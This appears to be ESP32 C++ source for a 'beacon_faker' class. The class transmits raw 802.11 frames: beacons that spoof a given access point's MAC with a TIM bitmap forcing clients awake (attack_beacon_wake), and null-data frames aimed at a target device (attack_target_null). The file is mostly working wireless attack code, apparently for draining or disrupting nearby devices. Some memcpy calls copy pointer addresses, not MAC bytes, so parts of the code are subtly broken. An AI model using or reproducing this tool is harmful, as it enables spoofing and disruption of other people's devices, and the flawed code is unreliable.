#include <beacon_faker.h>

uint8_t broadcast_addr[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
uint8_t magic_addr[] = {0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb};

uint8_t beacon_raw_template[] = {
    /* maC header */
    0x80, 0x00,							                        // 0-1: Frame Control
    0x00, 0x00,							                        // 2-3: Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,				            // 4-9: Destination address (broadcast)
    0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,				            // 10-15: Source address
    0xaa, 0xaa, 0xbb, 0xbb, 0xbb, 0xbb,				            // 16-21: BSSID
    0x00, 0x00,							                        // 22-23: Sequence / fragment number

    /* beacon body */
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,			    // 24-31: Timestamp (GETS OVERWRITTEN TO 0 BY HARDWARE)
    0x64, 0x00,							                        // 32-33: Beacon interval
    0x31, 0x04,							                        // 34-35: Capability info
    0x00, 0x00, 				                                // 36-38: SSID parameter set, 0x00:length:content
    /* FILL CONTENT HERE */
    0x01, 0x08, 0x82, 0x84,	0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24,	// 39-48: Supported rates
    0x03, 0x01, 0x01,						                    // 49-51: DS Parameter set, current channel 1 (= 0x01),
    0x05, 0x04, 0x01, 0x02, 0x00, 0x00,				            // 52-57: Traffic Indication Map, TIM
};

uint8_t beacon_buffer[MAX_BEACON_LEN];

void beacon_faker::setup(HardwareSerial* _Serial){
    mSerial = _Serial;
    nvs_flash_init();
    /**
     * Error checking using ESP_ERROR_CHECK macro.
     * Return type is esp_err_t
     */

    //stack configuration initialization, pass cfg to esp_wifi_init function.
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();

    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));  
    ESP_ERROR_CHECK(esp_wifi_start());
};

void beacon_faker::set_faker_srcAddr(uint8_t mac[6]){
    for (size_t i = 0; i < 6; i++)
    {
        _src_address[i] = mac[i];
    }
}

void beacon_faker::send_basic_beacon(){
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_raw_template, sizeof(beacon_raw_template), false));
}

/*
    This function will use the template to make
*/
void beacon_faker::send_imitate_beacon(uint8_t source_addr[6], uint8_t *TIM_bit_map, int map_len){

    memcpy(beacon_buffer, beacon_raw_template, sizeof(beacon_raw_template));
    
    struct mac_header_template m_header;
    struct beacon_TIM_template m_TIM;
    
    memcpy(&m_header.scr_addr, &source_addr, sizeof(uint8_t)*6);
    memcpy(&m_header.BSSID, &source_addr, sizeof(uint8_t)*6);
    memcpy(beacon_buffer, &m_header, sizeof(m_header));
    
    // map_len >= 1
    m_TIM.length = map_len + 4;
    for (size_t i = 0; i < map_len; i++){
        m_TIM.bitmap[i] = TIM_bit_map?TIM_bit_map[i]:0xff;
    }

    memcpy(beacon_buffer+TIM_OFFSET, &m_TIM, 5 + map_len);
    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, TIM_OFFSET + 5 + map_len, false));
}

void beacon_faker::attack_beacon_wake(uint8_t source_addr[6]){
    send_imitate_beacon(source_addr, nullptr, 4);
}


#define FRAME_CTRL_NULL_DATA 0x48

const char * faker_fails[] = 
    {
        "ESP_OK: success",
        "ESP_ERR_WIFI_IF: Invalid interface",
        "ESP_ERR_INVALID_ARG: Invalid parameter",
        "ESP_ERR_WIFI_NO_MEM: out of memory"    
    };

void beacon_faker::attack_target_null(uint8_t mmac[6]){
    struct mac_header_template header;

    header.Frame_Ctrl[0] = 0x48;
    memcpy(header.dest_addr, mmac, 6);
    memcpy(header.scr_addr, _src_address, 6);
    memcpy(header.BSSID, _src_address, 6);

    memcpy(beacon_buffer, &header, sizeof(header));
    
    // 空数据包只有null
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, beacon_buffer, sizeof(header), false);
    switch (err)
    {
    case ESP_OK:
        mSerial->println(faker_fails[0]);
        break;
    case ESP_ERR_WIFI_IF:
        mSerial->println(faker_fails[1]);
        break;
    case ESP_ERR_INVALID_ARG:
        mSerial->println(faker_fails[2]);
        break;
    default:
        mSerial->println("unknown");
        break;
    }

}